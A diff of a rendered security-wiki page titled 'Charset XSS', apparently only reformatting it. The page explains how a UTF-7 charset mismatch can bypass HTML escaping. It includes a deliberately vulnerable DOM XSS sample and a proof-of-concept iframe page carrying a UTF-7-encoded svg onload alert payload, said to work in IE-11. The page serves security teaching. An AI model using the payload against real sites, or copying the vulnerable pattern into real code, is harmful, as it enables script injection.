@@ -1,291 +1,69 @@
-<!doctype html><html lang=en dir=ltr>
-<head>
-<meta charset=utf-8>
-<meta name=viewport content="width=device-width,initial-scale=1">
-<meta name=description content="Charset XSS #  Charset XSS is useful in cases where application filters HTML special characters like < & >, You might have seen these characters converting back into &amp;gt; & &amp;lt; respectively.
+<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Charset XSS # Charset XSS is useful in cases where application filters HTML special characters like < & >, You might have seen these characters converting back into &amp;gt; & &amp;lt; respectively.
 For example consider the following codes
 <?php if(isset($_GET['xss'])) { echo htmlspecialchars($_GET['xss']); } ?> and similarly for DOM XSS code
-<html> <head> <title>test page</title> </head> <body> <script> var bad_string = window.location.hash.substring(1); var regex = /<\>/gi; var good_string = bad_string.">
-<meta name=theme-color content="#FFFFFF">
-<meta name=color-scheme content="light dark"><meta property="og:title" content="Charset XSS">
-<meta property="og:description" content="Charset XSS #  Charset XSS is useful in cases where application filters HTML special characters like < & >, You might have seen these characters converting back into &amp;gt; & &amp;lt; respectively.
+<html> <head> <title>test page</title> </head> <body> <script> var bad_string = window.location.hash.substring(1); var regex = /<\>/gi; var good_string = bad_string."><meta name=theme-color content="#FFFFFF"><meta name=color-scheme content="light dark"><meta property="og:title" content="Charset XSS"><meta property="og:description" content="Charset XSS # Charset XSS is useful in cases where application filters HTML special characters like < & >, You might have seen these characters converting back into &amp;gt; & &amp;lt; respectively.
 For example consider the following codes
 <?php if(isset($_GET['xss'])) { echo htmlspecialchars($_GET['xss']); } ?> and similarly for DOM XSS code
-<html> <head> <title>test page</title> </head> <body> <script> var bad_string = window.location.hash.substring(1); var regex = /<\>/gi; var good_string = bad_string.">
-<meta property="og:type" content="article">
-<meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/charset-xss/"><meta property="article:section" content="docs">
-<meta property="article:modified_time" content="2022-01-24T03:26:13+05:30">
-<title>Charset XSS | Cyber Security Wiki</title>
-<link rel=manifest href=/manifest.json>
-<link rel=icon href=/favicon.png type=image/x-icon>
-<link rel=stylesheet href=/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css integrity="sha256-VlqV4gQ0k5SeP6cts+wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin=anonymous>
-<script defer src=/flexsearch.min.js></script>
-<script defer src=/en.search.min.8f4d833baa43fe7ff06b587e0f17414c8b0013c4f137b9e2309ca94870581c51.js integrity="sha256-j02DO6pD/n/wa1h+DxdBTIsAE8TxN7niMJypSHBYHFE=" crossorigin=anonymous></script>
-<script defer src=/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js integrity="sha256-b2+Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC+NdcPIvZhzk=" crossorigin=anonymous></script>
-</head>
-<body dir=ltr>
-<input type=checkbox class="hidden toggle" id=menu-control>
-<input type=checkbox class="hidden toggle" id=toc-control>
-<main class="container flex">
-<aside class=book-menu>
-<div class=book-menu-content>
-<nav>
-<h2 class=book-brand>
-<a class="flex align-center" href=/><img src=/logo.png alt=Logo><span>Cyber Security Wiki</span>
-</a>
-</h2>
-<div class=book-search>
-<input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/>
-<div class="book-search-spinner hidden"></div>
-<ul id=book-search-results></ul>
-</div>
-<ul>
-<li>
-<br>
-<input type=checkbox id=section-3478c05c39c328756601a040a5f9b7dc class=toggle checked>
-<label for=section-3478c05c39c328756601a040a5f9b7dc class="flex justify-between" style=font-weight:700>
-<a role=button>Application Security</a>
-</label>
-<ul>
-<li>
-<br>
-<input type=checkbox id=section-305f8624390448e7b7dfdcd57bcf3063 class=toggle checked>
-<label for=section-305f8624390448e7b7dfdcd57bcf3063 class="flex justify-between" style=font-weight:700>
-<a role=button>Web</a>
-</label>
-<ul>
-<li>
-<a href=https://cyber-security.wiki/docs/application-security/web/charset-xss/ class=active>Charset XSS</a>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>
-<br>
-<input type=checkbox id=section-eddb28de10b6358a7d90165be197c24d class=toggle>
-<label for=section-eddb28de10b6358a7d90165be197c24d class="flex justify-between" style=font-weight:700>
-<a role=button>Cloud Security</a>
-</label>
-<ul>
-</ul>
-</li>
-<li>
-<br>
-<input type=checkbox id=section-80f73357b2e3d82569ab2419d9c8fd53 class=toggle>
-<label for=section-80f73357b2e3d82569ab2419d9c8fd53 class="flex justify-between" style=font-weight:700>
-<a role=button>DevSecOps</a>
-</label>
-<ul>
-</ul>
-</li>
-<li>
-<br>
-<input type=checkbox id=section-f8c2cedc89ecea36eb3aab749e9d9325 class=toggle>
-<label for=section-f8c2cedc89ecea36eb3aab749e9d9325 class="flex justify-between" style=font-weight:700>
-<a role=button>Exploit Development</a>
-</label>
-<ul>
-</ul>
-</li>
-<li>
-<br>
-<input type=checkbox id=section-ac63c4b6399921ce8f97ed202a2ebcb8 class=toggle>
-<label for=section-ac63c4b6399921ce8f97ed202a2ebcb8 class="flex justify-between" style=font-weight:700>
-<a role=button>IoT Security</a>
-</label>
-<ul>
-</ul>
-</li>
-<li>
-<br>
-<input type=checkbox id=section-ff3f320cd65cf7b2cc2597d57706ff2e class=toggle>
-<label for=section-ff3f320cd65cf7b2cc2597d57706ff2e class="flex justify-between" style=font-weight:700>
-<a role=button>Machine Learning</a>
-</label>
-<ul>
-</ul>
-</li>
-<li>
-<br>
-<input type=checkbox id=section-3110560962cac834dcd3aead95e804a4 class=toggle>
-<label for=section-3110560962cac834dcd3aead95e804a4 class="flex justify-between" style=font-weight:700>
-<a role=button>Network</a>
-</label>
-<ul>
-</ul>
-</li>
-<li>
-<br>
-<input type=checkbox id=section-089d0b2a47920473e631158da2244e55 class=toggle>
-<label for=section-089d0b2a47920473e631158da2244e55 class="flex justify-between" style=font-weight:700>
-<a role=button>Red Teaming</a>
-</label>
-<ul>
-</ul>
-</li>
-<li>
-<br>
-<input type=checkbox id=section-b1f24361e619eb3af87e435a6f600cbe class=toggle>
-<label for=section-b1f24361e619eb3af87e435a6f600cbe class="flex justify-between" style=font-weight:700>
-<a role=button>Threat Modelling</a>
-</label>
-<ul>
-</ul>
-</li>
-</ul>
-<hr>
-<b>
-<ul>
-<li>
-<a href=/contribute/>
-Contribute
-</a>
-</li>
-<li>
-<a href=https://securecode.wiki target=_blank rel=noopener>
-Secure Code Wiki by Payatu
-</a>
-</li>
-</ul>
-</b>
-</nav>
-<script>(function(){var a=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(b){localStorage.setItem("menu.scrollTop",a.scrollTop)}),a.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
-</div>
-</aside>
-<div class=book-page>
-<header class=book-header>
-<div class="flex align-center justify-between">
-<label for=menu-control>
-<img src=/svg/menu.svg class=book-icon alt=Menu>
-</label>
+<html> <head> <title>test page</title> </head> <body> <script> var bad_string = window.location.hash.substring(1); var regex = /<\>/gi; var good_string = bad_string."><meta property="og:type" content="article"><meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/charset-xss/"><meta property="article:section" content="docs"><meta property="article:modified_time" content="2022-01-24T03:26:13+05:30"><title>Charset XSS | Cyber Security Wiki</title><link rel=manifest href=/manifest.json><link rel=icon href=/favicon.png type=image/x-icon><link rel=stylesheet href=/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css integrity="sha256-VlqV4gQ0k5SeP6cts+wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin=anonymous><script defer src=/flexsearch.min.js></script>
+<script defer src=/en.search.min.e92ed156665bc4d559da9a4b3140e73d3850afeae8ecb1da6b96a25497d079fd.js integrity="sha256-6S7RVmZbxNVZ2ppLMUDnPThQr+ro7LHaa5aiVJfQef0=" crossorigin=anonymous></script>
+<script defer src=/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js integrity="sha256-b2+Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC+NdcPIvZhzk=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
+<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><img src=/logo.png alt=Logo><span>Cyber Security Wiki</span></a></h2><div class=book-search><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><ul><li><br><input type=checkbox id=section-3478c05c39c328756601a040a5f9b7dc class=toggle checked>
+<label for=section-3478c05c39c328756601a040a5f9b7dc class="flex justify-between" style=font-weight:700><a role=button>Application Security</a></label><ul><li><br><input type=checkbox id=section-3d187f458be5e96a9f7134b06fcbe171 class=toggle>
+<label for=section-3d187f458be5e96a9f7134b06fcbe171 class="flex justify-between" style=font-weight:700><a role=button>Thick Client</a></label><ul><li><a href=https://cyber-security.wiki/docs/application-security/thick-client/checklist/>Checklist</a></li><li><a href=https://cyber-security.wiki/docs/application-security/thick-client/learningprocess/>Learning Process</a></li><li><a href=https://cyber-security.wiki/docs/application-security/thick-client/tools/>Tools</a></li></ul></li><li><br><input type=checkbox id=section-305f8624390448e7b7dfdcd57bcf3063 class=toggle checked>
+<label for=section-305f8624390448e7b7dfdcd57bcf3063 class="flex justify-between" style=font-weight:700><a role=button>Web</a></label><ul><li><a href=https://cyber-security.wiki/docs/application-security/web/charset-xss/ class=active>Charset XSS</a></li></ul></li></ul></li><li><br><input type=checkbox id=section-eddb28de10b6358a7d90165be197c24d class=toggle>
+<label for=section-eddb28de10b6358a7d90165be197c24d class="flex justify-between" style=font-weight:700><a role=button>Cloud Security</a></label><ul></ul></li><li><br><input type=checkbox id=section-80f73357b2e3d82569ab2419d9c8fd53 class=toggle>
+<label for=section-80f73357b2e3d82569ab2419d9c8fd53 class="flex justify-between" style=font-weight:700><a role=button>DevSecOps</a></label><ul></ul></li><li><br><input type=checkbox id=section-f8c2cedc89ecea36eb3aab749e9d9325 class=toggle>
+<label for=section-f8c2cedc89ecea36eb3aab749e9d9325 class="flex justify-between" style=font-weight:700><a role=button>Exploit Development</a></label><ul></ul></li><li><br><input type=checkbox id=section-ac63c4b6399921ce8f97ed202a2ebcb8 class=toggle>
+<label for=section-ac63c4b6399921ce8f97ed202a2ebcb8 class="flex justify-between" style=font-weight:700><a role=button>IoT Security</a></label><ul></ul></li><li><br><input type=checkbox id=section-ff3f320cd65cf7b2cc2597d57706ff2e class=toggle>
+<label for=section-ff3f320cd65cf7b2cc2597d57706ff2e class="flex justify-between" style=font-weight:700><a role=button>Machine Learning</a></label><ul></ul></li><li><br><input type=checkbox id=section-3110560962cac834dcd3aead95e804a4 class=toggle>
+<label for=section-3110560962cac834dcd3aead95e804a4 class="flex justify-between" style=font-weight:700><a role=button>Network</a></label><ul></ul></li><li><br><input type=checkbox id=section-089d0b2a47920473e631158da2244e55 class=toggle>
+<label for=section-089d0b2a47920473e631158da2244e55 class="flex justify-between" style=font-weight:700><a role=button>Red Teaming</a></label><ul></ul></li><li><br><input type=checkbox id=section-b1f24361e619eb3af87e435a6f600cbe class=toggle>
+<label for=section-b1f24361e619eb3af87e435a6f600cbe class="flex justify-between" style=font-weight:700><a role=button>Threat Modelling</a></label><ul></ul></li></ul><hr><b><ul><li><a href=/contribute/>Contribute</a></li><li><a href=https://securecode.wiki target=_blank rel=noopener>Secure Code Wiki by Payatu</a></li></ul></b></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label>
 <strong>Charset XSS</strong>
-<label for=toc-control>
-<img src=/svg/toc.svg class=book-icon alt="Table of Contents">
-</label>
-</div>
-<aside class="hidden clearfix">
-<nav id=TableOfContents>
-<ul>
-<li><a href=#charset-xss>Charset XSS</a>
-<ul>
-<li><a href=#requirements>Requirements</a></li>
-<li><a href=#example-works-in-ie-11>Example works in IE-11</a></li>
-</ul>
-</li>
-</ul>
-</nav>
-</aside>
-</header>
-<article class=markdown><h1 id=charset-xss>
-Charset XSS
-<a class=anchor href=#charset-xss>#</a>
-</h1>
-<p>Charset XSS is useful in cases where application filters HTML special characters like <code>&lt;</code> & <code>></code>, You might have seen these characters converting back into <code>&amp;gt;</code> & <code>&amp;lt;</code> respectively.</p>
-<p>For example consider the following codes</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>&lt;?php
-if(isset($_GET[&#39;xss&#39;])) {
-    echo htmlspecialchars($_GET[&#39;xss&#39;]);
-}
-?&gt;
-</code></pre></div><p>and similarly for DOM XSS code</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>&lt;html&gt;
-    &lt;head&gt;
-        &lt;title&gt;test page&lt;/title&gt;
-    &lt;/head&gt;
-    &lt;body&gt;
-        &lt;script&gt;
-            var bad_string = window.location.hash.substring(1);
-            var regex = /&lt;\&gt;/gi;
-            var good_string = bad_string.replace(regex,&#39;&#39;)
-            document.write(good_string);
-        &lt;/script&gt;
-    &lt;/body&gt;
-&lt;/html&gt;
-</code></pre></div><p>using charset XSS it is possible to bypass html special characters filtration</p>
-<h2 id=requirements>
-Requirements
-<a class=anchor href=#requirements>#</a>
-</h2>
-<ul>
-<li>Target site not implemented charset</li>
-<li>Target site implemented the wrong charset</li>
-</ul>
-<h2 id=example-works-in-ie-11>
-Example works in IE-11
-<a class=anchor href=#example-works-in-ie-11>#</a>
-</h2>
-<p>Consider the same DOM XSS code</p>
-<details open><summary>xss.html</summary>
-<div class=markdown-inner>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>&lt;html&gt;
-    &lt;head&gt;
-        &lt;title&gt;test page&lt;/title&gt;
-    &lt;/head&gt;
-    &lt;body&gt;
-        &lt;script&gt;
-            var bad_string = window.location.hash.substring(1);
-            var regex = /&lt;\&gt;/gi;
-            var good_string = bad_string.replace(regex,&#39;&#39;)
-            document.write(good_string);
-        &lt;/script&gt;
-    &lt;/body&gt;
-&lt;/html&gt;
-</code></pre></div>
-</div>
-</details>
-<p>Since this page does not have any charset defines that means it fulfil the requirements for charset XSS. In order to do it, we will create a document with UTF-7 encoding and load the vulnerable URL in the iframe.</p>
-<details open><summary>iframe.html</summary>
-<div class=markdown-inner>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>&lt;!DOCTYPE html&gt;
-&lt;html&gt;
-&lt;head&gt;
-    &lt;meta charset=&#34;UTF-7&#34;&gt;
-&lt;/head&gt;
-&lt;body&gt;
-    &lt;iframe src=&#34;http://lab.com:8888/common/c.html#&lt;p&gt;+ADw-svg/onload+AD0-alert(1444444)+AD4-&lt;/p&gt;&#34; frameborder=&#34;1&#34;
-        height=&#34;300&#34; width=&#34;500&#34;&gt;&lt;/iframe&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre></div>
-</div>
-</details>
-<p>As soon as we access iframe.html we triage javaScript code execution since xss.html doesn&rsquo;t have any charset defined and hence browser inherit top frame&rsquo;s charset which is UTF-7.</p>
-</article>
-<footer class=book-footer>
-<div class="flex flex-wrap justify-between">
-<div><a class="flex align-center" href=https://github.com/payatu/cybersec-wiki/commit/bffd1cf7c048b9641fd074ff675ed1bee9c03b77 title="Last modified by krAshwin | January 23, 2022" target=_blank rel=noopener>
-<img src=/svg/calendar.svg class=book-icon alt=Calendar>
-<span>January 23, 2022</span>
-</a>
-</div>
-<div>
-<a class="flex align-center" href=https://github.com/payatu/cybersec-wiki/edit/main/content/docs/application-security/web/charset-xss.md target=_blank rel=noopener>
-<img src=/svg/edit.svg class=book-icon alt=Edit>
-<span>Edit this page</span>
-</a>
-</div>
-</div>
-<script>(function(){function a(c){const a=window.getSelection(),b=document.createRange();b.selectNodeContents(c),a.removeAllRanges(),a.addRange(b)}document.querySelectorAll("pre code").forEach(b=>{b.addEventListener("click",function(c){a(b.parentElement),navigator.clipboard&&navigator.clipboard.writeText(b.parentElement.textContent)})})})()</script>
-</footer>
-<div class=book-comments>
-</div>
-<label for=menu-control class="hidden book-menu-overlay"></label>
-</div>
-<aside class=book-toc>
-<div class=book-toc-content>
-<nav id=TableOfContents>
-<ul>
-<li><a href=#charset-xss>Charset XSS</a>
-<ul>
-<li><a href=#requirements>Requirements</a></li>
-<li><a href=#example-works-in-ie-11>Example works in IE-11</a></li>
-</ul>
-</li>
-</ul>
-</nav>
-</div>
-</aside>
-</main>
-</body>
-</html>
+<label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#charset-xss>Charset XSS</a><ul><li><a href=#requirements>Requirements</a></li><li><a href=#example-works-in-ie-11>Example works in IE-11</a></li></ul></li></ul></nav></aside></header><article class=markdown><h1 id=charset-xss>Charset XSS
+<a class=anchor href=#charset-xss>#</a></h1><p>Charset XSS is useful in cases where application filters HTML special characters like <code>&lt;</code> & <code>></code>, You might have seen these characters converting back into <code>&amp;gt;</code> & <code>&amp;lt;</code> respectively.</p><p>For example consider the following codes</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>&lt;?php
+</span></span><span style=display:flex><span>if(isset($_GET[&#39;xss&#39;])) {
+</span></span><span style=display:flex><span>    echo htmlspecialchars($_GET[&#39;xss&#39;]);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>?&gt;
+</span></span></code></pre></div><p>and similarly for DOM XSS code</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>&lt;html&gt;
+</span></span><span style=display:flex><span>    &lt;head&gt;
+</span></span><span style=display:flex><span>        &lt;title&gt;test page&lt;/title&gt;
+</span></span><span style=display:flex><span>    &lt;/head&gt;
+</span></span><span style=display:flex><span>    &lt;body&gt;
+</span></span><span style=display:flex><span>        &lt;script&gt;
+</span></span><span style=display:flex><span>            var bad_string = window.location.hash.substring(1);
+</span></span><span style=display:flex><span>            var regex = /&lt;\&gt;/gi;
+</span></span><span style=display:flex><span>            var good_string = bad_string.replace(regex,&#39;&#39;)
+</span></span><span style=display:flex><span>            document.write(good_string);
+</span></span><span style=display:flex><span>        &lt;/script&gt;
+</span></span><span style=display:flex><span>    &lt;/body&gt;
+</span></span><span style=display:flex><span>&lt;/html&gt;
+</span></span></code></pre></div><p>using charset XSS it is possible to bypass html special characters filtration</p><h2 id=requirements>Requirements
+<a class=anchor href=#requirements>#</a></h2><ul><li>Target site not implemented charset</li><li>Target site implemented the wrong charset</li></ul><h2 id=example-works-in-ie-11>Example works in IE-11
+<a class=anchor href=#example-works-in-ie-11>#</a></h2><p>Consider the same DOM XSS code</p><details open><summary>xss.html</summary><div class=markdown-inner><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>&lt;html&gt;
+</span></span><span style=display:flex><span>    &lt;head&gt;
+</span></span><span style=display:flex><span>        &lt;title&gt;test page&lt;/title&gt;
+</span></span><span style=display:flex><span>    &lt;/head&gt;
+</span></span><span style=display:flex><span>    &lt;body&gt;
+</span></span><span style=display:flex><span>        &lt;script&gt;
+</span></span><span style=display:flex><span>            var bad_string = window.location.hash.substring(1);
+</span></span><span style=display:flex><span>            var regex = /&lt;\&gt;/gi;
+</span></span><span style=display:flex><span>            var good_string = bad_string.replace(regex,&#39;&#39;)
+</span></span><span style=display:flex><span>            document.write(good_string);
+</span></span><span style=display:flex><span>        &lt;/script&gt;
+</span></span><span style=display:flex><span>    &lt;/body&gt;
+</span></span><span style=display:flex><span>&lt;/html&gt;
+</span></span></code></pre></div></div></details><p>Since this page does not have any charset defines that means it fulfil the requirements for charset XSS. In order to do it, we will create a document with UTF-7 encoding and load the vulnerable URL in the iframe.</p><details open><summary>iframe.html</summary><div class=markdown-inner><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>&lt;!DOCTYPE html&gt;
+</span></span><span style=display:flex><span>&lt;html&gt;
+</span></span><span style=display:flex><span>&lt;head&gt;
+</span></span><span style=display:flex><span>    &lt;meta charset=&#34;UTF-7&#34;&gt;
+</span></span><span style=display:flex><span>&lt;/head&gt;
+</span></span><span style=display:flex><span>&lt;body&gt;
+</span></span><span style=display:flex><span>    &lt;iframe src=&#34;http://lab.com:8888/common/c.html#&lt;p&gt;+ADw-svg/onload+AD0-alert(1444444)+AD4-&lt;/p&gt;&#34; frameborder=&#34;1&#34;
+</span></span><span style=display:flex><span>        height=&#34;300&#34; width=&#34;500&#34;&gt;&lt;/iframe&gt;
+</span></span><span style=display:flex><span>&lt;/body&gt;
+</span></span><span style=display:flex><span>&lt;/html&gt;
+</span></span></code></pre></div></div></details><p>As soon as we access iframe.html we triage javaScript code execution since xss.html doesn&rsquo;t have any charset defined and hence browser inherit top frame&rsquo;s charset which is UTF-7.</p></article><footer class=book-footer><div class="flex flex-wrap justify-between"><div><a class="flex align-center" href=https://github.com/payatu/cybersec-wiki/commit/bffd1cf7c048b9641fd074ff675ed1bee9c03b77 title='Last modified by krAshwin | January 23, 2022' target=_blank rel=noopener><img src=/svg/calendar.svg class=book-icon alt=Calendar>
+<span>January 23, 2022</span></a></div><div><a class="flex align-center" href=https://github.com/payatu/cybersec-wiki/edit/main/content/docs/application-security/web/charset-xss.md target=_blank rel=noopener><img src=/svg/edit.svg class=book-icon alt=Edit>
+<span>Edit this page</span></a></div></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#charset-xss>Charset XSS</a><ul><li><a href=#requirements>Requirements</a></li><li><a href=#example-works-in-ie-11>Example works in IE-11</a></li></ul></li></ul></nav></div></aside></main></body></html>
